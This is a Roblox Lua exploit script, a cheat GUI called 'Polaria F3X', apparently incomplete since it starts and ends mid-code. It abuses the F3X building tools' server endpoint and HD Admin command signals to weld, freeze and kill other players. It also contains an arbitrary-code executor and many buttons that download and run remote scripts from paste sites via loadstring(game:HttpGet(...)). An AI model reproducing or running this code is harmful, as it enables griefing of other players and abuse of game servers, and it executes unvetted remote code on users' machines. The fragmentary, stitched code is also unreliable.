--[ Polaria F3X by anonymoos11i11i1 V.7 Last version (I'm quiting this f3x exploits shit bro) ]--


--[ if you deobfuscate and see this message I want to say that scripting is never a easy thing for me I try to learn Lua learn to understand stuffs my self I can make a gui I can make a SYNCAPI script but it's all over nothing is left I tried several several times but the winner get to write history and not the loser this community is full of doxing and cyber crimes I can't believe this collapsing kids game can have this dark truth ai is a tool that created hundreds of skids on scriptblox and now people can't even identify what's ai and what's not I am very disappointed you act tuff while you can't do shit ]--


--[ Make sure your device is not a potato to run the maps properly ]--

--[ Printing (Very useless)]--
            task.wait()
        end
        TextLabel:Destroy()
    end)()
end


RequestCommand:InvokeServer(";hat me 18268136683")

yeah=player.Backpack:FindFirstChild('Building Tools') or player.Backpack:FindFirstChild('F3X Btools!')
if yeah then
notify("This game has f3x/you have f3x so everyone gonna see what you're doing.")
task.wait(3)
notify("Press 'Z' to equip.")
elseif not yeah then
notify("LOL this game has no btools or f3x so this not gonna work here")
end

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end
function SetCollision(part, boolean)
    local args = {
        [1] = "SyncCollision",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CanCollide"] = boolean
            }
        }
    }
    _(args)
end
    function SetLocked(part,boolean)
        local args = {
            [1] = "SetLocked",
            [2] = {
                [1] = part
            },
            [3] = boolean
        }
        _(args)
    end
function yerpp(E)
local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = E,
                ["DecorationType"] = "Sparkles"
            }
        }
    }

   
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = E,
                ["DecorationType"] = "Sparkles",
                ["SparkleColor"] = Color3.fromRGB(255, 255, 0)
            } 
        } 
    }
    _(argsCreate)
    _(argsSync)
end

local knfe = character["Accessory (Knife McGrabbington III)"]

if knfe then
	local args = {
		"Remove",
		{
			knfe.Handle.SpecialMesh
		}
	}

	_(args)
end

local function Resize(part, size, ha)
	local args = {
		"SyncResize",
		{
			{
				Part = part,
				CFrame = ha,
				Size = size
			}
		}
	}
	_(args)
end

local function SetAnchor(boolean, part)
	local args = {
		"SyncAnchor",
		{
			{
				Part = part,
				Anchored = boolean
			}
		}
	}
	_(args)
end

function MovePart(part, cf)
    local args = {
        [1] = "SyncMove",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CFrame"] = cf
            }
        }
    }
    _(args)
end

local function Color(part, color)
	local args = {
		"SyncColor",
		{
			{
				Part = part,
				Color = color,
				UnionColoring = false
			}
		}
	}
	_(args)
end
function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

    function DestroyPart(part)
        local args = {
            [1] = "Remove",
            [2] = {
                [1] = part
            }
        }
        _(args)
    end

	function SetMesh(part,meshid,offseter)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
            ["Offset"] = offseter,
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = "rbxassetid://" .. texid
            }
        }
    }
    _(args)
end

    function SetTrans(part,int)
        local args = {
            [1] = "SyncMaterial",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Transparency"] = int
                }
            }
        }
        _(args)
    end

spawn(function()
yerpp(knfe.Handle)
end)
spawn(function()
AddMesh(knfe.Handle)
end)
spawn(function()
SetMesh(knfe.Handle, "18114736783",Vector3.new(0, 0, 0))
end)
spawn(function()
SetTexture(knfe.Handle, "80617091791234")
end)

function bleed(target)
    if not target or not target.Character then return end
    
    local stopBleeding = false
    local activeBloodParts = {} 
    local characterConnection
    characterConnection = target.CharacterAdded:Connect(function()
        stopBleeding = true

        for _, blood in pairs(activeBloodParts) do
            if blood and blood.Parent then
                DestroyPart(blood)
            end
        end
        if characterConnection then
            characterConnection:Disconnect()
        end
    end)
    

    coroutine.wrap(function()
        while not stopBleeding and target and target.Character do
            local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
            local rootPart = target.Character:FindFirstChild("HumanoidRootPart")
            
            if rootPart then

                coroutine.wrap(function()
                yez=CFrame.new(0,-10,0)
                    local blood = remote:InvokeServer("CreatePart", "Ball", yez, target.Character)
                    if blood then
                        table.insert(activeBloodParts, blood)
                        
                        spawn(function()
                        Color(blood, Color3.fromRGB(255, 0, 0))
                        end)
                    
                        spawn(function()
    Resize(blood, Vector3.new(0.2, 0.2, 0.2), rootPart.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1)))
end)
                        spawn(function()
                        SetAnchor(false, blood)
                        end)
                        coroutine.wrap(function()
                            wait(2)
                            Resize(blood, Vector3.new(0.8, 0.1, 0.8),blood.CFrame)
                            Resize(blood, Vector3.new(0.9, 0.1, 0.9),blood.CFrame)
                            SetTrans(blood, 0.9)
                            SetTrans(blood, 0.7)
                            SetTrans(blood, 0.5)
                            SetTrans(blood, 0.3)
                            SetTrans(blood, 0.1)
                            DestroyPart(blood)
                            
                        
                            for i, v in pairs(activeBloodParts) do
                                if v == blood then
                                    table.remove(activeBloodParts, i)
                                    break
                                end
                            end
                        end)()
                    end
                end)()
            end
            
            wait(0.005)
        end
    end)()
end

function c0lefect(E)
local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = E,
                ["DecorationType"] = "Sparkles"
            }
        }
    }

   
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = E,
                ["DecorationType"] = "Sparkles",
                ["SparkleColor"] = Color3.fromRGB(255, 255, 0)
            } 
        } 
    }

local args = {
	"Remove",
	{
		E:FindFirstChild('Sparkles')
	}
}



    _(argsCreate)
    _(argsSync)
task.wait(1)
    _(args)
end


			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
	
			end
function breakWelds(part)
    local welds = {}
    for _, weld in ipairs(part:GetDescendants()) do
        if weld:IsA("WeldConstraint") or weld:IsA("Weld") or weld:IsA("Motor6D") then
            table.insert(welds, weld)
        end
    end

    if #welds == 0 then
        return false
    end

    local args = {
        "RemoveWelds",
        welds
    }
    _(args)
    return true
end

local humanoid = character:FindFirstChildOfClass("Humanoid")

local arm = character:FindFirstChild("Right Arm") and character:FindFirstChild("Left Arm") and character:FindFirstChild("Torso") 
local holdAnimation = Instance.new("Animation")
holdAnimation.AnimationId = "rbxassetid://48146273"
local holdTrack = humanoid:LoadAnimation(holdAnimation)

local killAnimation = Instance.new("Animation")
killAnimation.AnimationId = "rbxassetid://48146273"
local killTrack = humanoid:LoadAnimation(killAnimation)

local knifeHoldAnim = Instance.new("Animation")
knifeHoldAnim.AnimationId = "rbxassetid://299225058"

local staffupAnim = Instance.new("Animation")
staffupAnim.AnimationId = "rbxassetid://27432691"

local swordhitAnim = Instance.new("Animation")
swordhitAnim.AnimationId = "rbxassetid://27432686"

local holdstaffAnim = Instance.new("Animation")
holdstaffAnim.AnimationId = "rbxassetid://57794492"

local stabAnim = Instance.new("Animation")
stabAnim.AnimationId = "rbxassetid://30174375"


				local track1 = humanoid:LoadAnimation(staffupAnim)
				local track2 = humanoid:LoadAnimation(swordhitAnim)
				holdTrack = humanoid:LoadAnimation(holdstaffAnim)




function GrabAnim()
				track1.Looped = false
				track2.Looped = false
				holdTrack.Looped = false

				track1:Play()
				track1.Stopped:Wait()

				track2:Play()
				track2.Stopped:Wait()

				holdTrack:Play()
				holdTrack:AdjustSpeed(0)
end

function Kill()
local stabTrack = humanoid:LoadAnimation(stabAnim)
	stabTrack.Looped = false
	stabTrack:Play()
	stabTrack.Stopped:Wait()

	if holdTrack then holdTrack:Stop() end
end


function failed()
				track1.Looped = false
				track2.Looped = false
				holdTrack.Looped = false

				track1:Play()
        track1:AdjustSpeed(3)
				track1.Stopped:Wait()

				
         holdTrack:Play()
         wait(0.3)
         holdTrack:Stop()
end


local isBusy = false
local alignPosition
local alignOrientation

local Players = game:GetService("Players")
local player = Players.LocalPlayer 

local function attachBehind(targetChar)
    local root = character:FindFirstChild("HumanoidRootPart")
    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
    if root and targetRoot then
        
        local attachment0 = root:FindFirstChild("Attachment") or Instance.new("Attachment", root)
        local attachment1 = targetRoot:FindFirstChild("Attachment") or Instance.new("Attachment", targetRoot)

   
        alignPosition = Instance.new("AlignPosition")
        alignPosition.MaxForce = 1000000
        alignPosition.Responsiveness = 200
        alignPosition.Attachment0 = attachment0
        alignPosition.Attachment1 = attachment1
        alignPosition.Parent = root
        alignOrientation = Instance.new("AlignOrientation")
        alignOrientation.MaxTorque = 1000000
        alignOrientation.Responsiveness = 200
        alignOrientation.Attachment0 = attachment0
        alignOrientation.Attachment1 = attachment1
        alignOrientation.Parent = root

     
        attachment1.Position = Vector3.new(0, 0, 0.5)
    end
end

local function detach()
    if alignPosition then
        alignPosition:Destroy()
        alignPosition = nil
    end
    if alignOrientation then
        alignOrientation:Destroy()
        alignOrientation = nil
    end
end

local function attacke()
    if isBusy then return end
    isBusy = true

    local hitPlayer = nil
local touchedConnection

local function onTouch(other)
    local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
    if otherPlayer and otherPlayer ~= player then
        hitPlayer = otherPlayer
    end
end

touchedConnection = arm.Touched:Connect(onTouch)
task.wait(0.15)
if touchedConnection then
    touchedConnection:Disconnect()
end

    if hitPlayer and hitPlayer.Character then
        
RequestCommand:InvokeServer(";speed " ..hitPlayer.Name.. " 0")
 
        
				track1.Looped = false
				track2.Looped = false
				holdTrack.Looped = false

				track1:Play()
				track1.Stopped:Wait()

				track2:Play()
        track2:AdjustSpeed(3)
				track2.Stopped:Wait()

				holdTrack:Play()
        
				holdTrack:AdjustSpeed(0)
spawn(function()
attachBehind(hitPlayer.Character)
wait(0.8)
detach()
end)
spawn(function()
SetLocked(hitPlayer.Character.Torso, false)
end)
spawn(function()
SetLocked(char.Torso, false)
end)
 Weld(character.Torso,hitPlayer.Character.Torso,character.Torso)
Weld(character.Torso,hitPlayer.Character.HumanoidRootPart,character.Torso)
Weld(character.Torso,hitPlayer.Character.Head,character.Torso)


wait(3)
            spawn(function()
            Kill()
            end)
            bleed(hitPlayer)
            wait(0.5)
           RequestCommand:InvokeServer(";kill " ..hitPlayer.Name)
           wait(0.5)
breakWelds(character.Torso)
breakWelds(hitPlayer.Character.Torso)
spawn(function()
wait(0.8)

spawn(function()
SetLocked(hitPlayer.Character.Torso, false)
end)
spawn(function()
SetLocked(hitPlayer.Character["Right Arm"], false)
end)
spawn(function()
SetLocked(hitPlayer.Character["Left Arm"], false)
end)
spawn(function()
SetLocked(hitPlayer.Character["Right Leg"], false)
end)
spawn(function()
SetLocked(hitPlayer.Character["Left Leg"], false)
end)

spawn(function()
SetCollision(hitPlayer.Character.Torso, true)
end)
spawn(function()
SetCollision(hitPlayer.Character["Right Arm"], true)
end)
spawn(function()
SetCollision(hitPlayer.Character["Left Arm"], true)
end)
spawn(function()
SetCollision(hitPlayer.Character["Right Leg"], true)
end)
spawn(function()
SetCollision(hitPlayer.Character["Left Leg"], true)
end)
end)

wait(0.3)
           
            
            isBusy = false
  

    else
        
        failed()
        wait(0.4)
            isBusy = false
    end
end




UserInputService.InputBegan:Connect(function(input, gameProcessed)
 if gameProcessed then return end

 if input.KeyCode == Enum.KeyCode.Z then
  local args = {
  "Remove",
  {
   knfe.Handle
  }
 }
 _(args)
 knfe:Destroy()

 RequestCommand:InvokeServer(";hat me 18420472059")
 wait(1)
 local knife = character:FindFirstChild("Accessory (KNIF4ELERFTAccessory)")

 spawn(function()
 local args = {
  "Remove",
  {
   knife.Handle.SpecialMesh
  }
 }
 _(args)
 end)

 spawn(function()
 AddMesh(knife.Handle)
 end)
 spawn(function()
 SetMesh(knife.Handle, "18114736783", Vector3.new(0, 0,-0.25))
 end)
 spawn(function()
 SetTexture(knife.Handle, "80617091791234")
 end)

 ready = true
 end 
end)




UserInputService.TouchTap:Connect(function(input, gameProcessed)
    if gameProcessed then return end
if ready == true then
    attacke()
end
end)

end
end)

nextpage_3.Name = "nextpage"
nextpage_3.Parent = scriptspage2
nextpage_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
nextpage_3.BorderColor3 = Color3.fromRGB(129, 26, 255)
nextpage_3.BorderSizePixel = 2
nextpage_3.Position = UDim2.new(0.463894963, 0, 0.922239065, 0)
nextpage_3.Size = UDim2.new(0, 34, 0, 15)
nextpage_3.Font = Enum.Font.Arial
nextpage_3.Text = "<"
nextpage_3.TextColor3 = Color3.fromRGB(255, 255, 255)
nextpage_3.TextSize = 18.000
nextpage_3.TextWrapped = true

ambientShadow.Name = "ambientShadow"
ambientShadow.Parent = top
ambientShadow.AnchorPoint = Vector2.new(0.5, 0.5)
ambientShadow.BackgroundTransparency = 1.000
ambientShadow.Position = UDim2.new(0.495623618, 0, 5.32758617, 14)
ambientShadow.Size = UDim2.new(1.0087527, 18, 11.8965521, 18)
ambientShadow.ZIndex = -15
ambientShadow.Image = "rbxassetid://1316045217"
ambientShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
ambientShadow.ImageTransparency = 0.810
ambientShadow.ScaleType = Enum.ScaleType.Slice
ambientShadow.SliceCenter = Rect.new(10, 10, 118, 118)

penumbraShadow.Name = "penumbraShadow"
penumbraShadow.Parent = top
penumbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
penumbraShadow.BackgroundTransparency = 1.000
penumbraShadow.Position = UDim2.new(0.503156483, 0, 5.42907858, 14)
penumbraShadow.Size = UDim2.new(0.993687093, 18, 11.6935692, 18)
penumbraShadow.ZIndex = -15
penumbraShadow.Image = "rbxassetid://1316045217"
penumbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
penumbraShadow.ImageTransparency = 0.810
penumbraShadow.ScaleType = Enum.ScaleType.Slice
penumbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

umbraShadow.Name = "umbraShadow"
umbraShadow.Parent = top
umbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
umbraShadow.BackgroundTransparency = 1.000
umbraShadow.Position = UDim2.new(0.503156483, 0, 5.42907858, 14)
umbraShadow.Size = UDim2.new(0.993687093, 18, 11.6935692, 18)
umbraShadow.ZIndex = -15
umbraShadow.Image = "rbxassetid://1316045217"
umbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
umbraShadow.ImageTransparency = 0.810
umbraShadow.ScaleType = Enum.ScaleType.Slice
umbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

local pages = {
	homepage,
	serverpage,
	scriptspage,
	executorpage,
	outputpage,
	scriptspage2,
	scriptspage3
}

local function showPage(page)
	for _,p in ipairs(pages) do
		if p then
			p.Visible = false
		end
	end
	page.Visible = true
end

Home.MouseButton1Click:Connect(function()
	showPage(homepage)
end)

Server.MouseButton1Click:Connect(function()
	showPage(serverpage)
end)

Scripts.MouseButton1Click:Connect(function()
	showPage(scriptspage)
end)

Executor.MouseButton1Click:Connect(function()
	showPage(executorpage)
end)

Output.MouseButton1Click:Connect(function()
	showPage(outputpage)
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

user.Text = player.Name

age.Text = player.AccountAge .. " Days"

jobid.Text = "Job ID: " .. game.JobId

RunService.RenderStepped:Connect(function()
	local t = os.date("*t")
	local timeStr = string.format("%02d:%02d:%02d", t.hour, t.min, t.sec)
	svrtime.Text = "Server Time: " .. timeStr
	realtime.Text = "Time: " .. timeStr
end)

local minimized = false

minimize.MouseButton1Click:Connect(function()
minimized = not minimized
	Holder.Visible = not minimized
end)

local maximized = false
local normalTopSize = top.Size
local normalTopPos = top.Position

maximize.MouseButton1Click:Connect(function()
	top.Position = UDim2.new(0.653, 0, 0.364, 0)
end)

local Players = game:GetService("Players")
local player = Players.LocalPlayer

local thumbType = Enum.ThumbnailType.HeadShot
local thumbSize = Enum.ThumbnailSize.Size420x420

local content, isReady = Players:GetUserThumbnailAsync(
	player.UserId,
	thumbType,
	thumbSize
)

user_2.Image = content

local scriptPages = {
	scriptspage,
	scriptspage2,
	scriptspage3
}

local currentScriptPage = 1

local function showScriptPage(index)
	for i, page in ipairs(scriptPages) do
		page.Visible = (i == index)
	end
	currentScriptPage = index
end

--[ This was bug and this is the reason why the Scriptspage only have 2 pages ]--
nextpage.MouseButton1Click:Connect(function()
showScriptPage(2)
end)
beforepage.MouseButton1Click:Connect(function()
showScriptPage(1)
end)
nextpage_2.MouseButton1Click:Connect(function()
showScriptPage(3)
end)
beforepage_2.MouseButton1Click:Connect(function()
showScriptPage(2)
end)
nextpage_3.MouseButton1Click:Connect(function()
	showScriptPage(1)
end)
Scripts.MouseButton1Click:Connect(function()
showScriptPage(1)
end)

exec.MouseButton1Click:Connect(function()
	if input.Text == "" then return end

	local success, err = pcall(function()
		loadstring(input.Text)()
	end)

	if success then
	else
	end
end)


clear.MouseButton1Click:Connect(function()
	input.Text = ""
end)

clear_2.MouseButton1Click:Connect(function()
	output.Text = "\n"
end)

primadon.MouseButton1Click:Connect(function()
rq:InvokeServer(";r15")
wait(1)
rq:InvokeServer(";removeaccessories")
wait(1)
rq:InvokeServer(";bundle me 38499587027735")
wait(1)
rq:InvokeServer(";size me 10")
loadstring(game:HttpGet("https://files.catbox.moe/8fmn5s.txt"))()
rq:InvokeServer(";speed me 30")
loadstring(game:HttpGet("https://files.catbox.moe/dyphvq.txt"))()
wait(1)
rq:InvokeServer(";hat me 65523893")
end)
ssp.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://files.catbox.moe/k8wxil.txt"))()
end)
nzi.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://files.catbox.moe/qnvbb3.txt"))()
rq:InvokeServer(";lockmap")
end)
hax1.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/5OyexrCa/raw"))()
end)
hax2.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/F3teCezC/raw"))()
end)
noot.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/ruDbhiGp/raw"))()
end)
ship.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://files.catbox.moe/8e8ivx.txt"))()
end)
sledoni.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/QtpOv6Ei/raw"))()
end)
infiniteyield.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/dOi4GDqd/raw"))()
end)

--[ Progress bar loading ]--

local maxPercentage = 100

local function updateProgress()
	for i = 0, maxPercentage do
		progress.Text = "Loading (" .. i .. "%)"
		task.wait(0.05 * (1 - (i / maxPercentage)))
	end

	progress.Text = "Success! You are now be able to use."
end

updateProgress()

local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer

    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

    local function GiveBTools()
        rq:InvokeServer(";btools")
    end

    GiveBTools()
    player.CharacterAdded:Connect(function()
        task.wait(1)
        GiveBTools()
    end)

local LogService = game:GetService("LogService")

local TextService = game:GetService("TextService")
local MAX_CHARS = 10000000

local function append(text)
	output.Text ..= text .. "\n"

	if #output.Text > MAX_CHARS then
		output.Text = string.sub(output.Text, #output.Text - MAX_CHARS)
	end

	output.CursorPosition = #output.Text + 1
end

local function formatMessage(message, messageType)
	if messageType == Enum.MessageType.MessageOutput then
		return "" .. message
	elseif messageType == Enum.MessageType.MessageWarning then
		return "" .. message
	elseif messageType == Enum.MessageType.MessageError then
		return "" .. message
	else
		return "" .. message
	end
end

LogService.MessageOut:Connect(function(message, messageType)
	append(formatMessage(message, messageType))
end)

local oldPrint = print
local oldWarn = warn
local oldError = error

print = function(...)
	local msg = table.concat({...}, " ")
	append("" .. msg)
	oldPrint(...)
end

warn = function(...)
	local msg = table.concat({...}, " ")
	append("" .. msg)
	oldWarn(...)
end

error = function(...)
	local msg = table.concat({...}, " ")
	append("" .. msg)
	oldError(...)
end

--[ function for young Sheldon (late add) ]--

sledoniyong.MouseButton1Click:Connect(function()
wait(2)

local gui = Instance.new("ScreenGui")
gui.Name = "Young shelon gui update"
gui.Parent = game.CoreGui
 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent


local Ui = Instance.new("Frame")
Ui.Size = UDim2.new(0.0, 489, 0.0, 300)
Ui.Position = UDim2.new(0.0, 0, 0.0, 0)
Ui.BackgroundColor3 = Color3.new(1, 1, 1)
Ui.BorderColor3 = Color3.new(0, 0, 0)
Ui.BorderSizePixel = 0
Ui.Active = true
Ui.BackgroundTransparency = 0.6
Ui.Draggable = true
Ui.Parent = gui
 
local Image = Instance.new("ImageLabel")
Image.Size = UDim2.new(1.004, 0, 1.0, 0)
Image.Position = UDim2.new(0.0, 0, 0.0, 0)
Image.BackgroundColor3 = Color3.new(0, 0, 0)
Image.ImageColor3 = Color3.new(1, 1, 1)
Image.Image = "rbxassetid://14902240136"
Image.ImageTransparency = 0.4
Image.Parent = Ui
 
Image.BackgroundTransparency = 1
 
local Text = Instance.new("TextLabel")
Text.Size = UDim2.new(1.0, 0, 0.1, 20)
Text.Position = UDim2.new(0.0, 0, 0.0, 0)
Text.BackgroundColor3 = Color3.new(0, 0, 0)
Text.BorderColor3 = Color3.new(0, 0, 0)
Text.BorderSizePixel = 1
Text.Text = "yong shelon gui"
Text.BackgroundTransparency = 1
Text.TextColor3 = Color3.new(0, 0, 0)
Text.Font = Enum.Font.Highway
Text.Parent = Image
Text.TextSize = 30
 
local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(0.6, 29, 0.7, 7)
TextBox.Position = UDim2.new(0.0, 4, 0.0, 45)
TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox.BorderColor3 = Color3.new(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Text = ""
TextBox.PlaceholderText = "Execute His Thoughts"
TextBox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextColor3 = Color3.new(0, 0, 0)
TextBox.BackgroundTransparency = 0.4
TextBox.Font = Enum.Font.SpecialElite
TextBox.TextSize = 18
TextBox.Parent = Image
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.ClearTextOnFocus = failed
TextBox.MultiLine = true
TextBox.TextWrapped = true
 
local Exe = Instance.new("TextButton")
Exe.Size = UDim2.new(0.1, 22, 0.1, 0)
Exe.Position = UDim2.new(0.0, 4, 0.0, 266)
Exe.BackgroundColor3 = Color3.new(1, 1, 1)
Exe.BorderColor3 = Color3.new(0, 0, 0)
Exe.BorderSizePixel = 0
Exe.Text = "exe"
Exe.BackgroundTransparency = 0.1
Exe.TextColor3 = Color3.new(0, 0, 0)
Exe.Font = Enum.Font.Montserrat
Exe.Parent = Image
Exe.TextSize = 21
Exe.MouseButton1Click:Connect(function()
assert(loadstring(TextBox.Text))()
end)
 
local clea = Instance.new("TextButton")
clea.Size = UDim2.new(0.1, 22, 0.1, 0)
clea.Position = UDim2.new(0.1, 31, 0.0, 266)
clea.BackgroundColor3 = Color3.new(1, 1, 1)
clea.BorderColor3 = Color3.new(0, 0, 0)
clea.BorderSizePixel = 0
clea.Text = "clear"
clea.BackgroundTransparency = 0.1
clea.TextColor3 = Color3.new(0, 0, 0)
clea.Font = Enum.Font.Montserrat
clea.Parent = Image
clea.TextSize = 21
clea.MouseButton1Click:Connect(function()
TextBox.Text = ""
end)
 
local Re = Instance.new("TextButton")
Re.Size = UDim2.new(0.1, 22, 0.1, 0)
Re.Position = UDim2.new(0.3, 8, 0.0, 266)
Re.BackgroundColor3 = Color3.new(1, 1, 1)
Re.BorderColor3 = Color3.new(0, 0, 0)
Re.BorderSizePixel = 0
Re.Text = "R6"
Re.BackgroundTransparency = 0.1
Re.TextColor3 = Color3.new(0, 0, 0)
Re.Font = Enum.Font.Montserrat
Re.Parent = Image
Re.TextSize = 21
Re.MouseButton1Click:Connect(function()
rq:InvokeServer(";r6")
end)
 
local R6 = Instance.new("TextButton")
R6.Size = UDim2.new(0.1, 22, 0.1, 0)
R6.Position = UDim2.new(0.4, 35, 0.0, 266)
R6.BackgroundColor3 = Color3.new(1,1, 1)
R6.BorderColor3 = Color3.new(0, 0, 0)
R6.BorderSizePixel = 0
R6.Text = "Re"
R6.BackgroundTransparency = 0.1
R6.TextColor3 = Color3.new(0, 0, 0)
R6.Font = Enum.Font.Montserrat
R6.Parent = Image
R6.TextSize = 23
R6.MouseButton1Click:Connect(function()
rq:InvokeServer(";re")
end)
 
local Scr = Instance.new("ScrollingFrame")
Scr.Size = UDim2.new(0.3, 7, 0.5, 39)
Scr.Position = UDim2.new(0.0, 332, 0.0, 72)
Scr.BackgroundColor3 = Color3.new(1, 1, 1)
Scr.BorderColor3 = Color3.new(0, 0, 0)
Scr.BorderSizePixel = 0
Scr.Parent = Image
Scr.ScrollBarThickness = 0
 
Scr.BackgroundTransparency = 1
 
local Jojo = Instance.new("TextButton")
Jojo.Size = UDim2.new(0.9, 19, 0.0, 25)
Jojo.Position = UDim2.new(0.0, 0, 0.0, 0)
Jojo.BackgroundColor3 = Color3.new(1, 1, 1)
Jojo.BorderColor3 = Color3.new(0, 0, 0)
Jojo.BorderSizePixel = 0
Jojo.Text = "Steve"
Jojo.BackgroundTransparency = 0.3
Jojo.TextColor3 = Color3.new(0, 0, 0)
Jojo.Font = Enum.Font.Montserrat
Jojo.Parent = Scr
Jojo.TextSize = 19
Jojo.MouseButton1Click:Connect(function()
rq:InvokeServer(";r15")
wait(1)
rq:InvokeServer(";char me q_rc7")
wait(1)
rq:InvokeServer(";bundle me 46771")
wait(1)
rq:InvokeServer(";shirt me 16512333409")
wait(1)
rq:InvokeServer(";pants me 14955922682")
wait(1)
loadstring(game:HttpGet("https://pastebin.com/raw/pJ7r63eC"))()
rq:InvokeServer(";head me 0")
wait(1)
rq:InvokeServer(";hat me 128875258353354")
loadstring(game:HttpGet("https://pastebin.com/raw/X6XxjFbx"))()
local player = game.Players.LocalPlayer
local Character = player.Character or player.CharacterAdded:Wait()
local HMD = Character.HumanoidRootPart

function GitAud(soundgit,filename)
    SoundName=tostring(SoundName)
    local url=soundgit
    local FileName = filename
    writefile(FileName..".mp3", game:HttpGet(url))
    return (getcustomasset or getsynasset)(FileName..".mp3")
end

function CustomGitSound(soundlink, vol, filename)
local BGMusic = Instance.new("Sound")
    BGMusic.SoundId = GitAud(soundlink, filename)
    BGMusic.Parent = HMD
    BGMusic.Volume = 2
    BGMusic.Name = "BGM_MUSIC"
    BGMusic.Looped = true
    BGMusic:Play()
end




local player = game.Players.LocalPlayer
local char = player.Character
local tool
for i,v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
for i,v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

